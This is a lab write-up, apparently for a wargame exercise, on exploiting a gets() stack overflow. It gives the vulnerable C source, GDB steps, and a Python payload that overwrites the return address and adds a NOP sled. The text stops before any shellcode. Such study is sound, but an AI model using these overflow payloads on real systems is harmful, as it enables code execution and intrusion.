# Stack 5

Stack 5 source
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

We can utilize the same padding offset we found in stack4 to overwrite the return address. We have to return from the main function to shellcode that we write to the stack. We will write a NOP sled before the shellcode, and set the main function return address to around the middle of the NOP sled. This will ensure that the exploit works even if the stack moves around due to inconsistencies.

To find our new return address, we can use GDB.

```shell
gdb stack5
(gdb) disassemble main
```
We find that the return instruction is at 0x080483da.
```shell
(gdb) break *0x080483da
(gdb) r
asldkjfl
```
Then, when the program hits the breakpoint, we check the stack.
```shell
(gdb) x/8wx $esp
```
The stack pointer is currently at 0xbffffcbc. This is before the return address is removed from the stack. We now want to decide on our new return address. If we make the NOP sled 30 operations long, then 0xbffffcd0 should work, since it would be around the middle of the NOP sled. Finally, at the end of the NOP sled, we must place shellcode. The problem suggests using someone else's shellcode 

```python
print("".join([chr(i)*4 for i in range(65,84)])+"\xd0\xfc\xff\xbf"+"\x90"*30)
```
